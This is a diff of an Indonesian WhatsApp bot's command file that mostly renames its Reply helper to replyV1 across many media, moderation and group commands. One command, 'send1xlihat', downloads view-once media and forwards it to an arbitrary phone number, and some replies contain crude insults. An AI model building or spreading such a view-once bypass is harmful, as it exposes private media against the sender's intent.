       `Balas gambar/video/audio atau kasih teks!\nContoh: ${prefix + command} hallo`
     );
   }
   if (!isCreator && m.chat !== targetGc) {
-    return Reply("⚠️ Hanya owner yang bisa kirim status ke grup lain!");
+    return replyV1("⚠️ Hanya owner yang bisa kirim status ke grup lain!");
   }
   const sentStatus = await groupSatus(conn, targetGc, options);
   if (!storeGroupStatusRecord(targetGc, sentStatus?.key, 'swgc')) {
@@ -24794,7 +24767,7 @@ case "toimg":
 case "sticker2img":
 case "stickertoimg": {
     if (!m.quoted) {
-        return Reply(
+        return replyV1(
             `❌ Reply sticker yang ingin diubah menjadi foto.\n\n` +
             `Contoh:\n` +
             `${prefix}toimg`
@@ -24806,16 +24779,16 @@ case "stickertoimg": {
             m.quoted.msg?.mimetype ||
             ""
         if (!/^image\/webp$/i.test(mime)) {
-            return Reply(
+            return replyV1(
                 `❌ Yang kamu reply bukan sticker.\n\n` +
                 `Reply sticker lalu gunakan:\n` +
                 `${prefix}toimg`
             )
         }
-        await Reply("⏳ Mengubah sticker menjadi foto...")
+        await replyV1("⏳ Mengubah sticker menjadi foto...")
         const media = await m.quoted.download()
         if (!media) {
-            return Reply("❌ Gagal mengunduh sticker.")
+            return replyV1("❌ Gagal mengunduh sticker.")
         }
         await conn.sendMessage(
             m.chat,
@@ -24829,7 +24802,7 @@ case "stickertoimg": {
         )
     } catch (err) {
         console.error("[TOIMG ERROR]", err)
-        return Reply(
+        return replyV1(
             `❌ Gagal mengubah sticker menjadi foto.\n\n` +
             `Error: ${err?.message || err}`
         )
@@ -24837,31 +24810,31 @@ case "stickertoimg": {
 }
 break
 case "tomedia": {
-    if (!m.quoted) return Reply(`⚠️ Reply ke *dokumen foto/video* yang ingin dikonversi menjadi media!`)
+    if (!m.quoted) return replyV1(`⚠️ Reply ke *dokumen foto/video* yang ingin dikonversi menjadi media!`)
     
     let mime = m.quoted.mimetype || ''
-    if (!/image|video/.test(mime)) return Reply(`⚠️ File tidak didukung! Harus berupa dokumen *foto* atau *video*.`)
+    if (!/image|video/.test(mime)) return replyV1(`⚠️ File tidak didukung! Harus berupa dokumen *foto* atau *video*.`)
 
     try {
         let media = await m.quoted.download()
-        if (!media) return Reply(`❌ Gagal mengunduh media.`)
-        Reply(" loading...")
+        if (!media) return replyV1(`❌ Gagal mengunduh media.`)
+        replyV1(" loading...")
         if (/image/.test(mime)) {
             await conn.sendMessage(m.chat, { image: media, caption: `✅ Berhasil dikonversi dari dokumen ke foto.` }, { quoted: m })
         } else if (/video/.test(mime)) {
             await conn.sendMessage(m.chat, { video: media, caption: `✅ Berhasil dikonversi dari dokumen ke video.` }, { quoted: m })
         } else {
-            Reply(`❌ Format file tidak dikenali.`)
+            replyV1(`❌ Format file tidak dikenali.`)
         }
     } catch (err) {
         console.error(err)
-        Reply(`❌ Terjadi kesalahan saat konversi media.`)
+        replyV1(`❌ Terjadi kesalahan saat konversi media.`)
     }
 }
 break
 case "tgstiker":
 case "tgsticker":
-  if (!text) return Reply("Kirim link Telegram sticker pack.");
+  if (!text) return replyV1("Kirim link Telegram sticker pack.");
 async function sendTelegramPackAsStickers(conn, from, m, stickerUrl) {
   try {
     // --- FETCH API ---
@@ -24916,7 +24889,7 @@ function delay(ms) {
   break; 
 case 'ban': {
   // cek apakah yang menjalankan owner
-  if (!isCreator) return Reply(mess.owner)
+  if (!isCreator) return replyV1(mess.owner)
 
   // target user: prioritas mention > quoted > nomor di text
   let targetJid = null;
@@ -24930,21 +24903,21 @@ case 'ban': {
     targetJid = number ? (number + '@s.whatsapp.net') : null;
   }
 
-  if (!targetJid) return Reply('Mohon tag/quote user atau kirim nomor. Contoh: .ban @user atau .ban 62812xxx');
+  if (!targetJid) return replyV1('Mohon tag/quote user atau kirim nomor. Contoh: .ban @user atau .ban 62812xxx');
 
   // jangan ban bot sendiri
   if (targetJid === botNumber) {
-    return Reply('Tidak bisa membanned bot lah jir, make ni orang');
+    return replyV1('Tidak bisa membanned bot lah jir, make ni orang');
   }
 
   // cek sudah dibanned
   if (isBannedUser(targetJid)) {
-    return Reply('user udah di ban, ngapain lu ban lagi jir lah, mending di unban paok');
+    return replyV1('user udah di ban, ngapain lu ban lagi jir lah, mending di unban paok');
   }
 
   const ok = addBannedUser(targetJid);
   if (ok) {
-    Reply(`⛈️Sukses membanned:\n${targetJid}\nJika ingin membuka ban: .unban @user`);
+    replyV1(`⛈️Sukses membanned:\n${targetJid}\nJika ingin membuka ban: .unban @user`);
     // opsional: log ke owner / group admin
     try {
       if (conn && conn.sendMessage) {
@@ -24953,12 +24926,12 @@ case 'ban': {
       }
     } catch (e) { /* ignore */ }
   } else {
-    return Reply('Gagal menyimpan data banned. Cek permission file.');
+    return replyV1('Gagal menyimpan data banned. Cek permission file.');
   }
 } break;
 // --- optional: case "unban" untuk membuka ban ---
 case 'unban': {
-  if (!isCreator) return Reply(mess.owner) 
+  if (!isCreator) return replyV1(mess.owner) 
 
   let targetJid = null;
   if (m.mentionedJid && m.mentionedJid.length) {
@@ -24970,17 +24943,17 @@ case 'unban': {
     targetJid = number ? (number + '@s.whatsapp.net') : null;
   }
 
-  if (!targetJid) return Reply('Mohon tag/quote user atau kirim nomor. Contoh: .unban @user atau .unban 62812xxx');
+  if (!targetJid) return replyV1('Mohon tag/quote user atau kirim nomor. Contoh: .unban @user atau .unban 62812xxx');
 
   if (!isBannedUser(targetJid)) {
-    return Reply('User tersebut tidak terdapat di daftar banned.');
+    return replyV1('User tersebut tidak terdapat di daftar banned.');
   }
 
   const ok = removeBannedUser(targetJid);
   if (ok) {
-    return Reply(`Sukses membuka ban: ${targetJid}`);
+    return replyV1(`Sukses membuka ban: ${targetJid}`);
   } else {
-   return Reply('Gagal menghapus dari daftar banned. Cek permission file.');
+   return replyV1('Gagal menghapus dari daftar banned. Cek permission file.');
   }
 } 
 break;
@@ -24993,7 +24966,7 @@ case "stfjawa": {
     const [nama, judul] = input.split("|").map(s => s.trim())
 
     if (!nama || !judul) {
-        return Reply(`Contoh:\n${prefix}stfjawa XnalzNotDev|Orang Paling Ganteng Se-Jawa`)
+        return replyV1(`Contoh:\n${prefix}stfjawa XnalzNotDev|Orang Paling Ganteng Se-Jawa`)
     }
 
     try {
@@ -25058,7 +25031,7 @@ case "stfjawa": {
 
     } catch (e) {
         console.error("ERROR stfjawa:", e)
-        Reply("❌ Gagal membuat sertifikat jawa")
+        replyV1("❌ Gagal membuat sertifikat jawa")
     }
 }
 break
@@ -25066,7 +25039,7 @@ case "pegangtext": {
     const { createCanvas, loadImage } = require('canvas')
 
     let text = args.join(" ")
-    if (!text) return Reply(`Contoh:\n${prefix}gatau XnalzNotDev ganteng`)
+    if (!text) return replyV1(`Contoh:\n${prefix}gatau XnalzNotDev ganteng`)
 
     try {
         const width = 1024
@@ -25129,14 +25102,14 @@ case "pegangtext": {
 
     } catch (e) {
         console.log(e)
-        Reply("❌ Error load gambar / URL")
+        replyV1("❌ Error load gambar / URL")
     }
 }
 break
 case "send1xlihat": {
-if (!m.quoted) return Reply("Reply pesan viewOnce!")
+if (!m.quoted) return replyV1("Reply pesan viewOnce!")
 let nomor = args[0]
-if (!nomor) return Reply(`Contoh:\n${prefix}send1xlihat kenomor tujuan\ncontoh .send1xlihat 628xxxx`)
+if (!nomor) return replyV1(`Contoh:\n${prefix}send1xlihat kenomor tujuan\ncontoh .send1xlihat 628xxxx`)
 
 let jid = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 
@@ -25144,7 +25117,7 @@ try {
     let msg = m.quoted.message
     let type = Object.keys(msg)[0]
 
-    if (!msg[type].viewOnce) return Reply("❌ Pesan itu bukan viewOnce!")
+    if (!msg[type].viewOnce) return replyV1("❌ Pesan itu bukan viewOnce!")
 
     // 🔥 ambil media
     let media = await downloadContentFromMessage(
@@ -25178,11 +25151,11 @@ try {
         })
     }
 
-    Reply("✅ ViewOnce berhasil dikirim ke nomor!")
+    replyV1("✅ ViewOnce berhasil dikirim ke nomor!")
 
 } catch (e) {
     console.log(e)
-    Reply("❌ Gagal kirim viewOnce")
+    replyV1("❌ Gagal kirim viewOnce")
 }
 }
 break
@@ -25190,13 +25163,13 @@ case "wantedganteng": {
     const { createCanvas, loadImage } = require('canvas')
 
     let text = args.join(" ")
-    if (!text) return Reply(`Contoh:\n${prefix}wanted XnalzNotDev si paling ganteng+reply foto 😎`)
+    if (!text) return replyV1(`Contoh:\n${prefix}wanted XnalzNotDev si paling ganteng+reply foto 😎`)
 
     let q = m.quoted ? m.quoted : m
     let mime = (q.msg || q).mimetype || ''
 
     if (!/image/.test(mime)) {
-        return Reply("📸 Kirim / reply gambar!\nContoh: .wanted Agus + kirim foto")
+        return replyV1("📸 Kirim / reply gambar!\nContoh: .wanted Agus + kirim foto")
     }
 
     try {
@@ -25286,7 +25259,7 @@ case "wantedganteng": {
 
     } catch (e) {
         console.log(e)
-        Reply("❌ Error membuat poster")
+        replyV1("❌ Error membuat poster")
     }
 }
 break
@@ -25294,14 +25267,14 @@ case "wanted": {
     const { createCanvas, loadImage } = require('canvas')
 
     let text = args.join(" ")
-    if (!text) return Reply(`Contoh:\n${prefix}wanted XnalzNotDev si paling ganteng+reply foto`)
+    if (!text) return replyV1(`Contoh:\n${prefix}wanted XnalzNotDev si paling ganteng+reply foto`)
 
     // 🔥 ambil gambar dari user
     let q = m.quoted ? m.quoted : m
     let mime = (q.msg || q).mimetype || ''
 
     if (!/image/.test(mime)) {
-        return Reply("📸 Kirim / reply gambar!\nContoh: .wanted Agus + kirim foto")
+        return replyV1("📸 Kirim / reply gambar!\nContoh: .wanted Agus + kirim foto")
     }
 
     try {
@@ -25367,7 +25340,7 @@ case "wanted": {
 
     } catch (e) {
         console.log(e)
-        Reply("❌ Error membuat poster")
+        replyV1("❌ Error membuat poster")
     }
 }
 break
@@ -25375,16 +25348,16 @@ case "hd":
 case "tohd": {
 try {
 
-if (!m.quoted) return Reply("📸 reply gambar")
+if (!m.quoted) return replyV1("📸 reply gambar")
 
 let mime = (m.quoted.msg || m.quoted).mimetype || ''
-if (!mime.includes("image")) return Reply("❌ harus gambar")
+if (!mime.includes("image")) return replyV1("❌ harus gambar")
 
-Reply("⏳ processing HD...")
+replyV1("⏳ processing HD...")
 
 // 🔥 ambil buffer
 let buffer = await m.quoted.download()
-if (!buffer) return Reply("❌ gagal ambil gambar")
+if (!buffer) return replyV1("❌ gagal ambil gambar")
 
 // 🔥 function HD anti crash
 const HD = async (buffer) => {
@@ -25413,28 +25386,28 @@ caption: "✨ HD 4x berhasil\n> XNALZNOTDEV"
 
 } catch (e) {
 console.log("ERROR HD:", e)
-Reply("❌ gagal convert HD (image tidak support)")
+replyV1("❌ gagal convert HD (image tidak support)")
 }
 }
 break
 
 case "addprem": case "addpremium": {
-if (!isCreator) return Reply(mess.owner)
-if (!text && !m.quoted) return Reply(example("6285###"))
+if (!isCreator) return replyV1(mess.owner)
+if (!text && !m.quoted) return replyV1(example("6285###"))
 const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 const input2 = input.split("@")[0]
-if (input2 === global.owner || premium.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller!`)
+if (input2 === global.owner || premium.includes(input) || input === botNumber) return replyV1(`Nomor ${input2} sudah menjadi reseller!`)
 premium.push(input)
 await fs.writeFileSync(projectPath('library', 'database', 'premium.json'), JSON.stringify(premium, null, 2))
-Reply(`Berhasil menambah User kacung jadi Prem  ✅`)
+replyV1(`Berhasil menambah User kacung jadi Prem  ✅`)
 }
 break
 
 case 'totalchat':
 case 'statgroup': {
-  if (!m.isGroup) return Reply('Fitur ini hanya bisa digunakan di grup.');
+  if (!m.isGroup) return replyV1('Fitur ini hanya bisa digunakan di grup.');
   const stats = getTodayStats(m.chat)
-  if (Object.keys(stats).length === 0) return Reply('Belum ada data chat hari ini.')
+  if (Object.keys(stats).length === 0) return replyV1('Belum ada data chat hari ini.')
   let teks = `*Statistik Chat Hari Ini:*\n\n`
   const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1])
   let i = 1
@@ -25442,7 +25415,7 @@ case 'statgroup': {
     const name = conn.getName ? await conn.getName(user) : user.split('@')[0]
     teks += `${i++}. ${name} - ${total} chat\n`
   }
-  Reply(teks)
+  replyV1(teks)
 }
 break
 
@@ -25454,7 +25427,7 @@ case 'smeme': {
     const bottomText = (input[1] || '').trim().toUpperCase()
 
     if (!topText || !bottomText) {
-        return Reply(
+        return replyV1(
             `乂 *SMEME GENERATOR*\n\n` +
             `Reply gambar dengan perintah:\n` +
             `.smeme TEKS ATAS|TEKS BAWAH\n\n` +
@@ -25475,7 +25448,7 @@ case 'smeme': {
             : null
 
     if (!mediaMessage) {
-        return Reply(
+        return replyV1(
             '❌ Reply gambar atau kirim gambar dengan caption .smeme TEKS ATAS|TEKS BAWAH'
         )
     }
@@ -25624,7 +25597,7 @@ case 'smeme': {
             }
         })
 
-        return Reply(
+        return replyV1(
             '❌ Gagal membuat meme. Periksa gambar dan coba lagi'
         )
     }
@@ -25701,7 +25674,7 @@ const sfile = {
     } catch (e) { throw new Error(`${e.message}`) }
   }
 }
-    if (!args[0]) return Reply('Example :.sfile https://sfile.mobi/2E5O1HMVKcc')
+    if (!args[0]) return replyV1('Example :.sfile https://sfile.mobi/2E5O1HMVKcc')
     let data = await sfile.download(args[0], true)
     let { file_name, mimetype, upload_date, download_count, author_name } = data.metadata
     let type = mime.lookup(file_name) || 'application/octet-stream'
@@ -25712,7 +25685,7 @@ const sfile = {
       await sendScraprToWhatsApp(conn, m, scraprResult);
     } catch (scraprError) {
       console.warn('[SCRAPR SFILE FALLBACK]', scraprError?.message || scraprError);
-      Reply(e?.message || 'Gagal mengunduh Sfile.');
+      replyV1(e?.message || 'Gagal mengunduh Sfile.');
     }
   }
 }
@@ -25728,7 +25701,7 @@ case 'tofigure2': {
     const mime = (q.msg || q).mimetype || "";
 
     if (!/image/.test(mime))
-      return Reply(`✨ Balas *gambar* dengan caption *.${command}*`);
+      return replyV1(`✨ Balas *gambar* dengan caption *.${command}*`);
 
     await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 
@@ -25770,7 +25743,7 @@ case 'tofigure2': {
 
     const resultBuffer = Buffer.from(resApi.data);
     if (!resultBuffer || resultBuffer.length < 1000)
-      Reply("❌ API tidak mengembalikan gambar yang valid");
+      replyV1("❌ API tidak mengembalikan gambar yang valid");
 
     // Kirim hasil
     await conn.sendMessage(
@@ -25783,18 +25756,18 @@ case 'tofigure2': {
 
   } catch (e) {
     console.error(e);
-    Reply(`❌ Terjadi kesalahan: ${e.message}`);
+    replyV1(`❌ Terjadi kesalahan: ${e.message}`);
   }
 }
 break;
 
 case 'list': {
     if (mess.owner) {
-if (!isCreator && !isAdmins) return Reply(mess.admin)
-if (!m.quoted) return Reply("Reply pesannya")
+if (!isCreator && !isAdmins) return replyV1(mess.admin)
+if (!m.quoted) return replyV1("Reply pesannya")
     }
-    if (db_respon_list.length === 0) return Reply(`Belum ada list respon didalam database!`)
-    if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return Reply(`Belum ada list respon didalam grup ini!`)
+    if (db_respon_list.length === 0) return replyV1(`Belum ada list respon didalam database!`)
+    if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return replyV1(`Belum ada list respon didalam grup ini!`)
 
     // Ambil data list respon khusus grup ini
     let sections = []
@@ -25810,7 +25783,7 @@ if (!m.quoted) return Reply("Reply pesannya")
     }
 
     // Jika tidak ada data
-    if (sections.length === 0) return Reply(`Belum ada list respon di grup ini!`)
+    if (sections.length === 0) return replyV1(`Belum ada list respon di grup ini!`)
 
     // Buat button interaktif
     let msg = generateWAMessageFromContent(m.chat, {
@@ -25868,74 +25841,74 @@ break
 
 case 'addlist':
 if (mess.owner) {
-if (!isCreator && !isAdmins) return Reply(mess.admin)
+if (!isCreator && !isAdmins) return replyV1(mess.admin)
  }
 var args1 = q.split("|")[0].toLowerCase()
 var args2 = q.split("|")[1]
-if (!q.includes("|")) return Reply(`Gunakan dengan cara ${prefix}addlist key|respon\n\nContoh: ${prefix}addlist tes|apa`)
-if (isAlreadyResponList(m.chat, args1, db_respon_list)) return Reply(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
+if (!q.includes("|")) return replyV1(`Gunakan dengan cara ${prefix}addlist key|respon\n\nContoh: ${prefix}addlist tes|apa`)
+if (isAlreadyResponList(m.chat, args1, db_respon_list)) return replyV1(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
 if (/image/.test(mime)) {
   let qw = m.quoted ? quoted : m
   let media = await conn.downloadAndSaveMediaMessage(qw)
   const url = await CatBox(media)
       addResponList(m.chat, args1, args2, true, url, db_respon_list)
-      Reply(`Sukses addlist respon\nKey: ${args1}`)
+      replyV1(`Sukses addlist respon\nKey: ${args1}`)
       if (fs.existsSync(media)) fs.unlinkSync(media)
 } else {
   addResponList(m.chat, args1, args2, false, '-', db_respon_list)
-  Reply(`Sukses addlist respon\nKey: ${args1}`)
+  replyV1(`Sukses addlist respon\nKey: ${args1}`)
 }
 break
 
 case 'dellist':
 if (mess.owner) {
-if (!isCreator && !isAdmins) return Reply(mess.admin)
+if (!isCreator && !isAdmins) return replyV1(mess.admin)
  }
-if (db_respon_list.length === 0) return Reply(`Belum ada list respon didalam database!`)
-if (!text) return Reply(`Gunakan dengan cara ${prefix}dellist key\n\nContoh: ${prefix}dellist tes`)
-if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return Reply(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
+if (db_respon_list.length === 0) return replyV1(`Belum ada list respon didalam database!`)
+if (!text) return replyV1(`Gunakan dengan cara ${prefix}dellist key\n\nContoh: ${prefix}dellist tes`)
+if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return replyV1(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
 delResponList(m.chat, q.toLowerCase(), db_respon_list)
-Reply(`Sukses dellist respon dengan key: ${q}`)
+replyV1(`Sukses dellist respon dengan key: ${q}`)
 break
 
 case 'update':
 case 'updatelist':
 if (command === 'update' && !q.includes('|')) {
-    if (m.isGroup) return Reply('Gunakan command update melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('Gunakan command update melalui chat pribadi bot.')
     try {
         await githubUpdateUser.update({
             projectRoot: __dirname,
-            reply: message => Reply(message)
+            reply: message => replyV1(message)
         })
     } catch (error) {
         console.error('[GITHUB UPDATE]', error?.stack || error)
-        await Reply(`❌ Update gagal.\n${error?.message || 'Kesalahan tidak diketahui.'}`)
+        await replyV1(`❌ Update gagal.\n${error?.message || 'Kesalahan tidak diketahui.'}`)
     }
     break
 }
 if (mess.owner) {
-if (!isCreator && !isAdmins) return Reply(mess.admin)
+if (!isCreator && !isAdmins) return replyV1(mess.admin)
  }
 var args1 = q.split("|")[0].toLowerCase()
 var args2 = q.split("|")[1]
-if (!q.includes("|")) return Reply(`Gunakan dengan cara ${prefix}updatelist key|respon\n\nContoh: ${prefix}updatelist tes|apa`)
-if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return Reply(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
+if (!q.includes("|")) return replyV1(`Gunakan dengan cara ${prefix}updatelist key|respon\n\nContoh: ${prefix}updatelist tes|apa`)
+if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return replyV1(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
 if (/image/.test(mime)) {
   let qw = m.quoted ? quoted : m
   let media = await conn.downloadAndSaveMediaMessage(qw)
   const url = await CatBox(media)
       updateResponList(m.chat, args1, args2, true, url, db_respon_list)
-      Reply(`Berhasil update respon list dengan key *${args1}*`)
+      replyV1(`Berhasil update respon list dengan key *${args1}*`)
       if (fs.existsSync(media)) fs.unlinkSync(media)
 } else {
   updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
-  Reply(`Berhasil update respon list dengan key *${args1}*`)
+  replyV1(`Berhasil update respon list dengan key *${args1}*`)
 }
 break
         
 case 'listgroup':
 case 'listgrup': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
 
     try {
         const groups = await conn.groupFetchAllParticipating()
@@ -25943,7 +25916,7 @@ case 'listgrup': {
         const groupList = Object.values(groups)
 
         if (groupList.length === 0) {
-            return Reply('❌ Bot belum bergabung di grup mana pun.')
+            return replyV1('❌ Bot belum bergabung di grup mana pun.')
         }
 
         let teks = `╭─「 📋 LIST GRUP BOT 」\n`
@@ -25957,23 +25930,23 @@ case 'listgrup': {
             teks += `╰──────────────\n\n`
         })
 
-        await Reply(teks)
+        await replyV1(teks)
 
     } catch (err) {
         console.error('Error listgroup:', err)
-        Reply(`❌ Gagal mengambil daftar grup.\n\n${err.message}`)
+        replyV1(`❌ Gagal mengambil daftar grup.\n\n${err.message}`)
     }
 }
 break
 
 case "delete": case "del": {
-    if (!m.quoted) return Reply("❌ Reply pesan yang ingin dihapus.")
+    if (!m.quoted) return replyV1("❌ Reply pesan yang ingin dihapus.")
     if (m.isGroup) {
-        if (!isCreator && !isAdmins) return Reply(mess.admin)
-        if (!isBotAdmins) return Reply(mess.botAdmin)
+        if (!isCreator && !isAdmins) return replyV1(mess.admin)
+        if (!isBotAdmins) return replyV1(mess.botAdmin)
     } else {
-        if (!isCreator) return Reply(mess.owner)
-        if (!m.quoted.fromMe) return Reply("❌ Di chat pribadi, bot hanya bisa menghapus pesan yang dikirim bot sendiri.")
+        if (!isCreator) return replyV1(mess.owner)
+        if (!m.quoted.fromMe) return replyV1("❌ Di chat pribadi, bot hanya bisa menghapus pesan yang dikirim bot sendiri.")
     }
     try {
         const quotedKey = m.quoted.key || {
@@ -25985,23 +25958,23 @@ case "delete": case "del": {
         return await conn.sendMessage(m.chat, { delete: quotedKey })
     } catch (error) {
         console.error('[DELETE ERROR]', error?.stack || error)
-        return Reply(`❌ Gagal menghapus pesan: ${error?.message || error}`)
+        return replyV1(`❌ Gagal menghapus pesan: ${error?.message || error}`)
     }
 }
 break
 
 case 'warn': {
     if (mess.owner) {
-if (!isCreator && !isAdmins) return Reply(mess.admin)
-if (!m.quoted) return Reply("Reply pesannya")
+if (!isCreator && !isAdmins) return replyV1(mess.admin)
+if (!m.quoted) return replyV1("Reply pesannya")
   }
     if (mess.botAdmin) {
-if (!isBotAdmins) return Reply(mess.botAdmin) 
+if (!isBotAdmins) return replyV1(mess.botAdmin) 
 }
     if (text || m.quoted) {
 const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
 var onWa = await conn.onWhatsApp(input.split("@")[0])
-if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")
+if (onWa.length < 1) return replyV1("Nomor tidak terdaftar di whatsapp")
 try {
         await addWarning(
             conn,
@@ -26011,7 +25984,7 @@ try {
         )
     } catch(e){
         console.error(e)
-      await Reply(`ada kesalahan ni njir dicodenya ${e.message || e}`) 
+      await replyV1(`ada kesalahan ni njir dicodenya ${e.message || e}`) 
       }
    }
  }
@@ -26020,24 +25993,24 @@ break
 case 'antitagsw':
 case 'antitagstatus': {
 if (mess.owner) {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 }
 if (mess.admin) {
-if (!isAdmins) return Reply(mess.admin) 
+if (!isAdmins) return replyV1(mess.admin) 
 }
 if (mess.botAdmin) {
-if (!isBotAdmins) return Reply(mess.botAdmin) 
+if (!isBotAdmins) return replyV1(mess.botAdmin) 
 }
-if (!m.isGroup) return Reply("Khusus Buat grup jir lu siapa make di pribadi, otak rusak banyak coli inimah 😹") 
+if (!m.isGroup) return replyV1("Khusus Buat grup jir lu siapa make di pribadi, otak rusak banyak coli inimah 😹") 
 
 const argsLower = q.toLowerCase();
 if (argsLower === "on") {
         db.chats[m.chat].antitagsw = true
-        return Reply("✅ Anti Tag Status AKTIF!")
+        return replyV1("✅ Anti Tag Status AKTIF!")
 }
     if (argsLower === "off") {
         db.chats[m.chat].antitagsw = false
-        return Reply("✅ Anti Tag Status NONAKTIF!") 
+        return replyV1("✅ Anti Tag Status NONAKTIF!") 
  }
 
 if (db.chats[m.chat]?.antitagsw && m.isGroup) {
@@ -26068,24 +26041,24 @@ if (db.chats[m.chat]?.antitagsw && m.isGroup) {
 
 case 'antispam': {
 if (mess.owner) {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 }
 if (mess.admin) {
-if (!isAdmins) return Reply(mess.admin) 
+if (!isAdmins) return replyV1(mess.admin) 
 }
 if (mess.botAdmin) {
-if (!isBotAdmins) return Reply(mess.botAdmin) 
+if (!isBotAdmins) return replyV1(mess.botAdmin) 
 }
-if (!m.isGroup) return Reply("Khusus Buat grup jir lu siapa make di pribadi, otak rusak banyak coli inimah 😹") 
+if (!m.isGroup) return replyV1("Khusus Buat grup jir lu siapa make di pribadi, otak rusak banyak coli inimah 😹") 
 
     if (args[0] === "on") {
         db.chats[m.chat].antispam = true;
-        return Reply("✔️ AntiSpam berhasil diaktifkan!");
+        return replyV1("✔️ AntiSpam berhasil diaktifkan!");
     } else if (args[0] === "off") {
         db.chats[m.chat].antispam = false;
-        return Reply("❌ AntiSpam dimatikan!");
+        return replyV1("❌ AntiSpam dimatikan!");
     } else {
-        return Reply(`❗ Gunakan:
+        return replyV1(`❗ Gunakan:
 - antispam on
 - antispam off`);
     }
@@ -26093,10 +26066,10 @@ if (!m.isGroup) return Reply("Khusus Buat grup jir lu siapa make di pribadi, ota
 break;
 
 case 'readmore': {
-  if (!text.includes('|')) return Reply('Gunakan tanda "|" untuk memisahkan bagian teks dengan efek readmore.\nContoh: .readmore aku | suka | kamu ❤️')
+  if (!text.includes('|')) return replyV1('Gunakan tanda "|" untuk memisahkan bagian teks dengan efek readmore.\nContoh: .readmore aku | suka | kamu ❤️')
   const more = String.fromCharCode(8206).repeat(4001)
   const teks = text.split('|').join(more)
-  Reply(teks)
+  replyV1(teks)
 }
   break
   
@@ -26119,7 +26092,7 @@ case 'waifu': {
     )
   } catch (e) {
     console.error(e)
-    await Reply(`🍂 *Ups error:* ${e.message || e}`)
+    await replyV1(`🍂 *Ups error:* ${e.message || e}`)
   } finally {
     await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
   }
@@ -26128,9 +26101,9 @@ break
 
 case 'gpt': {
     try {
-        if (!text) return Reply('gpt versi -3 apa yg kamu cari')
+        if (!text) return replyV1('gpt versi -3 apa yg kamu cari')
         const aiProxyToken = getXeryuuPrivateKey('aiProxyBearer', 'XERYUU_AI_PROXY_TOKEN', ['aiProxyToken']);
-        if (!aiProxyToken) return Reply('⚙️ API GPT belum dikonfigurasi. Isi XERYUU_AI_PROXY_TOKEN atau apiKeys.aiProxyBearer di authen.js lokal.');
+        if (!aiProxyToken) return replyV1('⚙️ API GPT belum dikonfigurasi. Isi XERYUU_AI_PROXY_TOKEN atau apiKeys.aiProxyBearer di authen.js lokal.');
         
         
         let { data } = await axios.post(
@@ -26154,9 +26127,9 @@ case 'gpt': {
             }
         )
         
-        Reply(data.choices[0].message.content)
+        replyV1(data.choices[0].message.content)
     } catch (e) {
-        Reply(e.message)
+        replyV1(e.message)
     }
 }
 break
@@ -26165,10 +26138,10 @@ case "creategc":
  case "creategroup":
  {
  if (!isCreator) {
- return Reply(mess.owner)
+ return replyV1(mess.owner)
  }
  if (!args.join(" ")) {
- return Reply(`Use ${cmd} groupname`);
+ return replyV1(`Use ${cmd} groupname`);
  }
  try {
  let cret = await conn.groupCreate(args.join(" "), []);
@@ -26189,7 +26162,7 @@ https://chat.whatsapp.com/${response}
  });
  } catch (e) {
  console.error(e) 
- return Reply("yah Error kak laporankan ke owner agar di perbaiki", e);
+ return replyV1("yah Error kak laporankan ke owner agar di perbaiki", e);
  }
  }
  break;
@@ -26198,14 +26171,14 @@ case 'balogo': {
     try {
 
         if (!args[0]) {
-            return Reply(
+            return replyV1(
                 `🍀 *Masukkan dua teks untuk logo! (pisahkan dengan |)*\n\n✨ *Contoh: ${command} XnalzNotDev|Gv*`
             );
         }
 
         let [textL, textR] = args.join(' ').split('|');
         if (!textL || !textR) {
-            return Reply(
+            return replyV1(
                 `☘️ *Format salah! Gunakan: ${command} TextKiri|TextKanan*`
             );
         }
@@ -26215,7 +26188,7 @@ case 'balogo': {
         let response = await fetch(apiUrl);
         if (!response.ok) {
             console.error('[ba-logo API Error]', response.status);
-            return Reply('🍂 *Gagal menghubungi API logo maker!*');
+            return replyV1('🍂 *Gagal menghubungi API logo maker!*');
         }
 
         let buffer = Buffer.from(await response.arrayBuffer());
@@ -26229,7 +26202,7 @@ case 'balogo': {
         );
     } catch (e) {
         console.error('[ba-logo Handler Error]', e);
-        Reply(`🍂 *Ups, gagal membuat logo!* \nDetail: ${e.message || e}`);
+        replyV1(`🍂 *Ups, gagal membuat logo!* \nDetail: ${e.message || e}`);
     } finally {
     }
 };
@@ -26237,17 +26210,17 @@ break
 case "facebook":
 case "fb": {
     const facebookInput = String(text || '').trim().split(/\s+/)[0] || '';
-    if (!facebookInput) return Reply("Masukkan link Facebook!");
+    if (!facebookInput) return replyV1("Masukkan link Facebook!");
     let validFacebookUrl;
     try {
         validFacebookUrl = new URL(/^https?:\/\//i.test(facebookInput) ? facebookInput : `https://${facebookInput}`);
         const facebookHost = validFacebookUrl.hostname.toLowerCase().replace(/^www\./, '');
         if (!['facebook.com', 'fb.watch', 'fb.com'].some(host => facebookHost === host || facebookHost.endsWith(`.${host}`))) {
-            return Reply('❌ Link harus berasal dari Facebook atau fb.watch.');
